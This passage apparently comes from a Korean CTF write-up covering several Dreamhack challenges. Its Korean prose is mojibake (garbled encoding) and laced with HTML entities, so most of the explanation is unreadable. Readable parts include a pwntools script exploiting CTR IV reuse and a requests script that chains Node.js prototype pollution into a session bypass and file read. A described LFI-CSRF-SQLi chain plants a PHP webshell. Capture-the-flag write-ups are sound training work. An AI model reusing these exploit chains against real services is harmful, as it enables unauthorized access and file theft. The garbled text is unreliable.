í¬í•¨ëœ ë¸”ë¡ì´ ë¹„êµë˜ì§€ ì•Šê³  ëë‚œ ê²ƒ ê°™ì•„ë³´ì´ëŠ” ì‹œê°„ ê³¼ì…ë ¥ìœ¼ë¡œ ë³´ë‚¸ ë¬¸ìì—´ì´ í¬í•¨ëœ ë¸”ë¡ì´ ë¹„êµë˜ê³  ëë‚œ ê²ƒ ê°™ì•„ë³´ì´ëŠ” ì‹œê°„ì˜ ì°¨ê°€ì—¬ëŸ¬ ë³€ìˆ˜ë¥¼ ê³ ë ¤í•˜ê³ ë„ ë‹¤ë¥¸ ë¬¸ì ëŒ€ë¹„ í° ë¬¸ì í•˜ë‚˜ê°€ ì¡´ì¬í•œë‹¤.í•´ë‹¹ ë¬¸ì ì—­ì‹œ ìµœì´ˆ ì‹¤í–‰ê³¼ ê°™ì€ ì´ìœ ë¡œ ì˜¬ë°”ë¥¸ ë¬¸ìë¼ê³  ìƒê°í•˜ì—¬ r ë’¤ì— ì¶”ê°€í•œë‹¤.ìœ„ ê³¼ì •ì„ ë°˜ë³µí•˜ë©´ ê°ê°ì˜ ë¸”ë¡ë“¤ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.ì´í›„ ë¸”ë¡ë“¤ì˜ ìˆœì„œë¥¼ ì ë‹¹íˆ ì•Œì•„ë‚´ë©´ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆë‹¤.O. Interchange - Cryptoìš´ìš©ë°©ì‹ ë³„ AES cipher 3ê°œê°€ ì£¼ì–´ì§€ê³ , ì›í•˜ëŠ” ë°©ì‹ì— encrypt ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆëŠ” ë¬¸ì œì´ë‹¤.CTRë¡œ encryptë¥¼ í•  ë•Œ, ì•”í˜¸í™”ë¥¼ í•  ë•Œë§ˆë‹¤ ë™ì¼í•œ ivë¥¼ ê°–ëŠ” cipherë¥¼ ê³„ì† ìƒì„±í•˜ê¸° ë•Œë¬¸ì—ì•„ì£¼ ê¸´ \\x00ì„ ì•”í˜¸í™” í•œ ê°’ê³¼ í”Œë˜ê·¸ë¥¼ ì•”í˜¸í™” í•œ ê°’ì„ xorí•˜ì—¬ í”Œë˜ê·¸ë¥¼ íœ™ë“í•˜ì˜€ë‹¤. Solution Scriptfrom pwn import *p = remote(&#39;host1.dreamhack.games&#39;, 8930)# p = process([&#39;python3&#39;,&#39;-u&#39;,&#39;chal.py&#39;])while not p.recvline().strip().endswith(b&#39;CTR&#39;): p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;3&#39;) p.recvline()p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;1&#39;)p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;\\x00&#39;*0x1000)key = bytes.fromhex(p.recvline().strip().split()[-1].decode())p.sendlineafter(b&#39;&amp;gt;&amp;gt; &#39;, b&#39;2&#39;)x = bytes.fromhex(p.recvline().strip().split()[-1].decode())print(xor(x,key)[:])p.interactive()Q. NSS - Webí”„ë¡œí† íƒ€ì… í´ë£¨ì…˜ì„ í†µí•´ LFIë¡œ ì—°ê²°ì‹œí‚¤ëŠ” ì»¨ì…‰ì˜ ë¬¸ì œì´ë‹¤.ê°œì¸ì ìœ¼ë¡œ ì˜¤ëœë§Œì— ì¬ë¯¸ìˆê²Œ í‘¼ ì›¹ ë¬¸ì œì¸ ê²ƒ ê°™ë‹¤.ìš°ì„  ì„œë²„ì—ëŠ” í¬ê²Œ ì„¸ ê°€ì§€ì˜ ê°ì²´ê°€ ì¡´ì¬í•œë‹¤.Users = {}Users[userid] = { userid : &quot;{userid}&quot;, pass : &quot;{hashed password}&quot;, workspaces : WORKSPACES, base_dir: &quot;{unique tmp path}&quot;}WORKSPACES = {}WORKSPACES[workspace_name] = {}tokens = {}tokens[token] = { owner: &quot;{userid}&quot;, expire: EXPIRE_TIME}ê·¸ë¦¬ê³  endpoint ì¤‘ì— ì•„ë˜ì™€ ê°™ì€ ë™ì‘ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ ìˆë‹¤.app.post(&quot;/api/users/:userid/:ws&quot;, (req, res) =&amp;gt; { const userid = req.params.userid || &quot;&quot;; const ws_name = req.params.ws || &quot;&quot;; const token = req.body.token || &quot;&quot;; const f_name = req.body.file_name || &quot;&quot;; const f_path = req.body.file_path.replace(/\\./g,&#39;&#39;) || &quot;&quot;; const f_content = req.body.file_content || &quot;&quot;; if(!userid || !token) return res.status(400).json({ok: false, err: &quot;Invalid id or token&quot;}); if(!check_session(userid, token)) return res.status(403).json({ok: false, err: &quot;Failed to validate session&quot;}); const user = users[userid]; if(!ws_name) return res.status(400).json({ok: false, err: &quot;Invalid workspace name&quot;}); const workspace = user.workspaces[ws_name]; if(!workspace) return res.status(404).json({ok: false, err: &quot;Failed to find workspace&quot;}); if(!f_name || !f_path) return res.status(400).json({ok: false, err: &quot;Invalid file name or path&quot;}); if(!write_b64_file(path.join(user.base_dir, f_path), f_content)) return res.status(500).json({ok: false, err: &quot;Internal server error&quot;}); workspace[f_name] = f_path; return res.status(200).json({ok: true});});í•¨ìˆ˜ì˜ ë‚´ìš©ì„ ìš”ì•½í•´ì„œ users[userid].workspaces[ws_name][f_name]ì— ì›í•˜ëŠ” ë¬¸ìì—´ì„ ë„£ì„ ìˆ˜ ìˆë‹¤.ì´ ë•Œ, ws_nameì„ ê²€ì¦í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ workspace[&#39;__proto__&#39;][f_name]í˜•íƒœë¡œ ë§Œë“¤ ìˆ˜ ìˆë‹¤.ë”°ë¼ì„œ í•´ë‹¹ í•¨ìˆ˜ì—ì„œ prototype pollutionì´ ë°œìƒí•œë‹¤.PPë¥¼ ì´ìš©í•´ì„œ ì´ë¤„ì•¼í•  ëª©í‘œëŠ” ì•„ë˜ í•¨ìˆ˜ë¥¼ í†µí•´ /usr/src/app/flagë¥¼ ì½ëŠ” ê²ƒì´ë‹¤.app.get(&quot;/api/users/:userid/:ws/:fname&quot;, (req, res) =&amp;gt; { const userid = req.params.userid || &quot;&quot;; const ws_name = req.params.ws || &quot;&quot;; const f_name = req.params.fname || &quot;&quot;; const token = req.body.token || &quot;&quot;; if(!userid || !token) return res.status(400).json({ok: false, err: &quot;Invalid userid or token&quot;}); if(!check_session(userid, token)) return res.status(403).json({ok: false, err: &quot;Failed to validate session&quot;}); const user = users[userid]; if(!ws_name) return res.status(400).json({ok: false, err: &quot;Invalid workspace name&quot;}); const workspace = user.workspaces[ws_name]; if(!workspace) return res.status(404).json({ok: false, err: &quot;Failed to find workspace&quot;}); if(!f_name) return res.status(400).json({ok: false, err: &quot;Invalid file name&quot;}); const f_path = workspace[f_name]; if(!f_path) return res.status(404).json({ok: false, err: &quot;Failed to find file&quot;}); const content = read_b64_file(path.join(user.base_dir, f_path)); if(typeof content == &quot;undefined&quot;) return res.status(500).json({ok: false, err: &quot;Internal server error&quot;}); res.status(200).json({ok: true, file_content: content});});ê·¸ë˜ì„œ ë‚´ê°€ ìƒê°í•œ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤. useridë¡œ __proto__ë¥¼ ì¤˜ì„œ users[__proto__]ë¥¼ ë¶€ë¥´ê²Œ í•œë‹¤. ws_nameë„ __proto__ë¥¼ ì¤˜ì„œ users[__proto__].workspaces[__proto__]ë¥¼ ë¶€ë¥´ê²Œ í•œë‹¤. f_nameìœ¼ë¡œ ì•„ë¬´ê±°ë‚˜ ì¤˜ì„œ user[__proto__].workspaces[__proto__][f_name]ì´ flagë¥¼ ë°˜í™˜í•˜ê²Œ í•œë‹¤. PPë¡œ user[__proto__].base_dirì´ /usr/src/appì„ ë°˜í™˜í•˜ê²Œ í•œë‹¤.ë”°ë¼ì„œ í˜„ì¬ê¹Œì§€ì˜ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ìœ„í•´ ë§Œë“¤ì–´ì•¼ í•  ê°’ì€ ì•„ë˜ì™€ ê°™ë‹¤. {}.__proto__.workspace = &quot;asdf&quot; -&amp;gt; users[__proto__].workspacesê°€ undefinedê°€ ë˜ì§€ ì•Šë„ë¡ {}.__proto__.asdf = &quot;flag&quot; -&amp;gt; user[__proto__].workspaces[__proto__][f_name]ì´ flagë¥¼ ë°˜í™˜í•˜ë„ë¡ {}.__proto__.base_dir = &quot;/usr/src/app&quot; -&amp;gt; user[__proto__].base_dirì´ /usr/src/appì„ ë°˜í™˜í•˜ë„ë¡ê·¸ëŸ°ë° ì½”ë“œë¥¼ ì¡°ê¸ˆ ë” ì‚´í´ë³´ë©´ ë¬¸ì œê°€ ìˆë‹¤.9ë²ˆì§¸ ì¤„ì˜ ë¶„ê¸°ë¥¼ í†µê³¼í•˜ëŠ” tokenì„ ë§Œë“¤ì–´ì•¼ í•œë‹¤.if(!check_session(userid, token)) return res.status(403).json({ok: false, err: &quot;Failed to validate session&quot;});check_session í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.function check_session(userid, token) { const sess = tokens[token] if(!sess) return false; if(sess.owner != userid) return false; if(sess.expire &amp;lt; Date.now() / 1000){ tokens.delete(token); return false; } else return true;}í•´ë‹¹ í•¨ìˆ˜ ë˜í•œ PPë¥¼ ì´ìš©í•´ì„œ í†µê³¼í•˜ê¸° ìœ„í•´ tokenì„ __proto__ë¡œ ì¤¬ì„ ë•Œì˜ í•„ìš”í•œ ì¡°ê±´ì„ ìƒê°í•˜ì˜€ë‹¤. tokens[__proto__].ownerê°€ __proto__ë¥¼ ë°˜í™˜ tokens[__proto__].ownerê°€ ë§¤ìš° í° ì •ìˆ˜ë¥¼ ë°˜í™˜ìœ„ ë‘ ì¡°ê±´ì„ ë§Œì¡±í•˜ë©´ í†µê³¼í•  ìˆ˜ ìˆëŠ”ë°1ë²ˆ ì¡°ê±´ì€ {}.__proto__.owner = &quot;__proto__&quot;ë¥¼ ì¤˜ì„œ ì‰½ê²Œ ë„˜ì–´ê°ˆ ìˆ˜ ìˆë‹¤.2ë²ˆ ì¡°ê±´ì€ {digit ë¬¸ìì—´} &amp;lt; {ì •ìˆ˜} ì‹ì´ {ì •ìˆ˜} &amp;lt; {ì •ìˆ˜}ë¡œ ì¸ì‹ë˜ëŠ” ì ì„ ì´ìš©í•´ì„œ{}.__proto__.expire = &quot;999999999999999&quot;ë¥¼ ì¤˜ì„œ ë„˜ì–´ê°ˆ ìˆ˜ ìˆë‹¤.ìœ„ì˜ PPë¥¼ ëª¨ë‘ ë§Œë“¤ê³  íŒŒì¼ì„ ë¶€ë¥´ë©´ í”Œë˜ê·¸ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤. Solution Scriptimport requestsfrom base64 import b64decodeURL = &quot;http://host2.dreamhack.games:12391/api&quot;# URL = &quot;http://localhost:8888/api&quot;proto_user = &quot;__proto__&quot;user = &quot;qqq&quot;pw = &quot;asdfasdfasdf&quot;ws = &quot;__proto__&quot;print(requests.post(URL + &quot;/users&quot;, json={&quot;userid&quot;:user,&quot;pass&quot;:pw}).json())c = requests.post(URL + &quot;/users/auth&quot;, json={&quot;userid&quot;:user,&quot;pass&quot;:pw}).json()print(c)token = c[&#39;token&#39;]### users[qqq].workspaces[&quot;__proto__&quot;].expire = &quot;99999999999999999999999999&quot;c = requests.post(URL + f&quot;/users/{user}/__proto__&quot;, json={&quot;userid&quot;:user,&quot;token&quot;:token,&quot;file_name&quot;:&quot;expire&quot;,&quot;file_content&quot;:&quot;zzlol&quot;,&quot;file_path&quot;:&quot;99999999999999999999999999&quot;}).json() print(c)### users[qqq].workspaces[&quot;__proto__&quot;].owner = &quot;__proto__&quot;c = requests.post(URL + f&quot;/users/{user}/__proto__&quot;, json={&quot;userid&quot;:user,&quot;token&quot;:token,&quot;file_name&quot;:&quot;owner&quot;,&quot;file_content&quot;:&quot;zzlol&quot;,&quot;file_path&quot;:&quot;__proto__&quot;}).json()print(c)### users[qqq].workspaces[&quot;__proto__&quot;].workspaces = &quot;asdfasdfasdf&quot;c = requests.post(URL + f&quot;/users/{user}/__proto__&quot;, json={&quot;userid&quot;:user,&quot;token&quot;:token,&quot;file_name&quot;:&quot;workspaces&quot;,&quot;file_content&quot;:&quot;zzlol&quot;,&quot;file_path&quot;:&quot;asdfasdfasdf&quot;}).json()print(c)### users[qqq].workspaces[&quot;__proto__&quot;].zzzzzz = &quot;flag&quot;c = requests.post(URL + f&quot;/users/{user}/__proto__&quot;, json={&quot;userid&quot;:user,&quot;token&quot;:token,&quot;file_name&quot;:&quot;zzzzzz&quot;,&quot;file_content&quot;:&quot;zzlol&quot;,&quot;file_path&quot;:&quot;flag&quot;}).json()print(c)### users[qqq].workspaces[&quot;__proto__&quot;].base_dir = &quot;/usr/src/app&quot;c = requests.post(URL + f&quot;/users/{user}/__proto__&quot;, json={&quot;userid&quot;:user,&quot;token&quot;:token,&quot;file_name&quot;:&quot;base_dir&quot;,&quot;file_content&quot;:&quot;zzlol&quot;,&quot;file_path&quot;:&quot;/usr/src/app&quot;}).json()print(c)### get(users.__proto__.base_dir + users.__proto__.workspaces.__proto__.zzzzzz)### == get(&quot;/usr/src/app/flag&quot;)c = requests.get(URL + &quot;/users/__proto__/__proto__/zzzzzz&quot;, json={&quot;userid&quot;:&#39;__proto__&#39;,&quot;token&quot;:&#39;__proto__&#39;,&quot;ws_name&quot;:&quot;123&quot;}).json()print(c)print(b64decode(c[&#39;file_content&#39;]).decode())R. billionaire - BlockchainContractë¥¼ ë°°í¬í•˜ëŠ” íŠ¸ëœì ì…˜ì˜ ë””í…Œì¼ í˜ì´ì§€ì— ë“¤ì–´ê°€ë©´, í”Œë˜ê·¸ ë°ì´í„°ê°€ ë‹´ê¸´ storageë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.íœ™ë“í•œ ë°ì´í„°ë¥¼ solidity ì½”ë“œì— ë§ê²Œ xorí•´ì£¼ë©´ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆë‹¤.T. Legendary - CryptoLegendre PRF ë¬¸ì œì´ë‹¤.ì–´ëŠ ê¹ƒí—ˆë¸Œ ë ˆí¬ì§€í† ë¦¬ì— ì´ë”ë¦¬ì›€ ë°”ìš´í‹°ê°€ ê±¸ë¦° Legendre PRFë¥¼ í’€ê¸° ìœ„í•œ ì†”ë¸Œ ì½”ë“œê°€ ì‘ì„±ë˜ì–´ ìˆì—ˆë‹¤.í•´ë‹¹ ë ˆí¬ì˜ solve.cppë¥¼ ì£¼ì–´ì§„ ë¬¸ì œì— ë§ê²Œ ì ë‹¹íˆ ìˆ˜ì •í•˜ì—¬ ì»´íŒŒì¼ í•œ í›„ ì‹¤í–‰í•˜ë©´ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆì—ˆë‹¤.U. Legendary - Revenge - CryptoTì—ì„œ primeì˜ ë¹„íŠ¸ ìˆ˜ê°€ ë§ì•„ì§€ê³ , outputì´ ì¤„ì–´ë“¤ì—ˆë‹¤.ë•Œë¬¸ì—, ë™ì¼í•œ ë°©ë²•ìœ¼ë¡œ í’€ì´ë¥¼ í•˜ë ¤ê³  ì‹œë„í–ˆë‹¤.í•˜ì§€ë§Œ ë§ì€ ë©”ëª¨ë¦¬ê°€ í•„ìš”í•´ì„œ vmí™˜ê²½ì—ì„œëŠ” ì‹¤í–‰í•  ìˆ˜ ì—†ëŠ”ë°ì–´ë– í•œ ì›ì¸ì—ì„œì¸ì§€ Host OS í™˜ê²½ì—ì„œëŠ” ì œëŒ€ë¡œ ì‹¤í–‰ì´ ë˜ì§€ ì•Šì•„ì„œì„œë²„ í˜¸ìŠ¤íŒ…ì„ í•˜ëŠ” ì¹œêµ¬ì˜ ë‚¨ëŠ” ìì›ì„ ë¹Œë ¤ì„œ 32ì½”ì–´, 32GBì˜ ë¨ì„ ê°€ì§„ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ë°›ì•˜ë‹¤.16ìŠ¤ë ˆë“œë¡œë¥¼ ì£¼ê³  10ë¶„ê°„ ëŒë¦° ê²°ê³¼ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆì—ˆë‹¤.í’€ê³ ë‚œ ì§í›„ì—ëŠ” ë„ˆë¬´ ë§ì€ ì»´í“¨íŒ… íŒŒì›Œê°€ í•„ìš”í•œê²Œ ì•„ë‹Œê°€ ì‹¶ì—ˆì§€ë§Œì¡°ê¸ˆ ìƒê°í•´ë³´ë‹ˆê¹Œ ì•„ë¬´ë˜ë„ ë‚´ í’€ì´ê°€ ì˜ë„ë˜ì§€ ì•Šì€ ìì› ë°•ì¹˜ê¸°ì¸ ê²ƒ ê°™ì•˜ë‹¤.ì˜ë„ë˜ì§„ ì•Šì•˜ë”ë¼ë„ ì½”ë“œë¥¼ ë³´ê³  ë¶„ì„í•´ì„œ ìˆ˜ì •í–ˆë‹¤ë©´ ì¡°ê¸ˆ ë” ì ì€ ìì›ìœ¼ë¡œë„ í’€ ìˆ˜ ìˆì§€ ì•Šì•˜ì„ê¹Œí•˜ëŠ” ìƒê°ì´ ë“ ë‹¤.V. ColorfulMemo - Webí•´ë‹¹ ë¬¸ì œëŠ” 3ê°œì˜ ì›¹ ì·¨ì•½ì ì„ ì—°ê³„í•´ì„œ ì›¹ì‰˜ì„ ë§Œë“œëŠ” ì»¨ì…‰ì˜ ë¬¸ì œì˜€ë‹¤.ì‚¬ìš©ëœ ì·¨ì•½ì ì€ LFI, CSRF, SQLiì´ë‹¤.ìš°ì„  index.phpë¥¼ ë³´ë©´&amp;lt;?php $path = $_GET[&quot;path&quot;]; if($path == &quot;&quot;){ $path = &quot;main&quot;; } $path = &quot;./&quot;.$path.&quot;.php&quot;;?&amp;gt;...(ì¤‘ëµ)...&amp;lt;?php include_once $path; ?&amp;gt;ìœ„ì™€ ê°™ì€ GET íŒŒë¼ë¯¸í„°ë¡œ ë‚ ì•„ì˜¨ pathê°’ì— ì•„ë¬´ëŸ° ê²€ì¦ ì—†ì´ ./ì™€ .phpë¥¼ ë¶™ì—¬ì„œ includeë¥¼ í•´ì¤€ë‹¤.ë”°ë¼ì„œ ìœ„ ë¶€ë¶„ì—ì„œ LFIê°€ ë°œìƒí•œë‹¤.ê¸€ì„ writeí•  ë•Œ, style íƒœê·¸ì— í° ì œì•½ ì—†ì´ ì•„ë¬´ê±°ë‚˜ ì“¸ ìˆ˜ ìˆë‹¤.ì´ë•Œ black;background-image:URL(URL)ë°©ì‹ìœ¼ë¡œ csrfë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆê²Œ ëœë‹¤.ë˜, check.phpë¥¼ ì‚´í´ë³´ë©´&amp;lt;?phpif($_SERVER[&quot;REMOTE_ADDR&quot;] == &#39;127.0.0.1&#39; || $_SERVER[&quot;REMOTE_ADDR&quot;] == &#39;::1&#39;){ $id = $_GET[&#39;id&#39;]; $mysqli = new mysqli(&#39;localhost&#39;,&#39;user&#39;,&#39;password&#39;,&#39;colorfulmemo&#39;); // I believe admin $result = $mysqli-&amp;gt;query(&#39;SELECT adminCheck FROM memo WHERE id = &#39;.$id);...(í›„ëµ)?&amp;gt;ë§Œì•½ í´ë¼ì´ì–¸íŠ¸ì˜ ì£¼ì†Œê°€ ë¡œì»¬ í˜¸ìŠ¤íŠ¸ì¸ ê²½ìš°ì—GET íŒŒë¼ë¯¸í„°ë¡œ ë‚ ë¦¬ëŠ” idë¥¼ ì´ìš©í•´ì„œ SQL injectionì´ ê°€ëŠ¥í•˜ë‹¤.ê·¸ëŸ°ë° my.cnfíŒŒì¼ì— secure-file-priv= /tmp/ê°€ ìˆìœ¼ë¯€ë¡œ/tmp ë””ë ‰í† ë¦¬ì— íŒŒì¼ì„ ì½ê³  ì“¸ìˆ˜ ìˆë‹¤.ê·¸ë˜ì„œ ìƒê°í•œ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤. writeí•  ë•Œ colorì— black;background-image:URL(&quot;/?path=check.php&amp;amp;id={ì ì ˆí•œ /tmp/asdf.php ì›¹ì‰˜ ì—…ë¡œë“œ êµ¬ë¬¸}&quot;)ì„ ì¤€ë‹¤.\\ ê·¸ë¦¬ê³  í•´ë‹¹ ê¸€ì„ ë¦¬í¬íŠ¸í•˜ë©´ CSRF -&amp;gt; SQLiê°€ ë°œìƒí•´ì„œ /tmp/asdf.phpì— ì›¹ì‰˜ì´ ë§Œë“¤ì–´ì§„ë‹¤.\\ /?path=../../../tmp/asdf.phpì— ì ‘ì†í•œë‹¤.ìœ„ ì‹œë‚˜ë¦¬ì˜¤ëŒ€ë¡œ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆì—ˆë‹¤.í›„ê¸°ì‘ë…„ FIESTA ì´í›„ë¡œ ëŒ€íšŒ ì‹œê°„ì´ ê¸´ CTFëŠ” ê½¤ ê°„ë§Œì— í•˜ëŠ” ê²ƒ ê°™ì•˜ë‹¤.ê¸´ CTFë¥¼ í•˜ë©´ ì‹œê°„ì„ ë§ì´ ë°•ì•„ë„ ë¶€ë‹´ì´ ì—†ì–´ì„œ ì¢‹ì§€ë§Œìˆœìœ„ ìœ ì§€ì— ê·¸ë§Œí¼ ì‹œê°„ì´ ë” ë“¤ì–´ì„œ í˜ì´ ë“œëŠ” ê²ƒ ê°™ë‹¤.ëª¨ìª¼ë¡¬ ë§ì´ ì–»ì–´ê°€ê³  ì¬ë¯¸ìˆê²Œ í–ˆë˜ CTFì˜€ë‹¤." } ]
